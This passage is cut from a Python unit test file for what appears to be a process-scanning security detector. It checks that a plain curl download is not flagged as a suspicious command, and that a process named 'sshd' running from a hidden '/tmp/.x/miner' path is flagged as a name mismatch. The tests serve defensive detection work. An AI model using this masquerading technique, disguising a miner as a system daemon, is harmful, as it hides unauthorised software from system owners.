                   "curl -o /var/lib/x https://example.com"):
            self.assertFalse(ps.SUSPECT_CMD.search(ok), ok)

    def test_comm_exe_mismatch(self):
        self.assertFalse(ps.comm_exe_mismatch("python3", "/usr/bin/python3.12"))
        self.assertTrue(ps.comm_exe_mismatch("sshd", "/tmp/.x/miner"))


if __name__ == "__main__":
    unittest.main(verbosity=2)
